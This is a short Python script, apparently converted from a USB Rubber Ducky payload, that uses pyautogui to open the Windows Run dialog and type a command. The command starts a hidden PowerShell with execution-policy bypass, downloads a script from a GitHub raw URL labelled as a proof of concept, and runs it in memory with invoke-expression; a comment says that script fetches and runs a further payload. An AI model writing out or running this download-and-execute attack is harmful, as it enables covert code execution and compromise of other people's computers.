# Converted using ducky2python by CedArctic (https://github.com/CedArctic/ducky2python) 
import pyautogui
import time
# Open the Windom run menu
pyautogui.hotkey("win","R")
time.sleep(0.5)
# Download and run in memory a PowerShell script. This powershell will then download the payload and run it.
pyautogui.typewrite("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/DuckyPOC/master/nice.ps1?dl=1; invoke-expression $pl", interval=0.02)
pyautogui.hotkey("enter")
